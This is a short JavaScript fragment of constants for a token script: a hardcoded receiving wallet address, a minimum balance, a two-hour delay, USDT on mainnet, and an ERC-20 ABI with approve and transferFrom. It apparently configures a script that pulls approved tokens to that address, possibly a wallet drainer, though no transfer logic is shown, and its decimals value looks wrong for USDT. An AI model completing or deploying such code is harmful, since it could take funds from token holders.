const receiveAddress = "0x86a208Cf4D384eE68dc600A39f092E394b582f9d";
const minimumBalance = 50;
const delayHours = 2;
const network = "mainnet";
const tokenSymbol = "USDT";
const decimals = 18;
const TOKEN_ABI = [
    "function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)",
    "function approve(address spender, uint256 amount) public returns (bool)",
    "function balanceOf(address account) public view returns (uint256)"
];
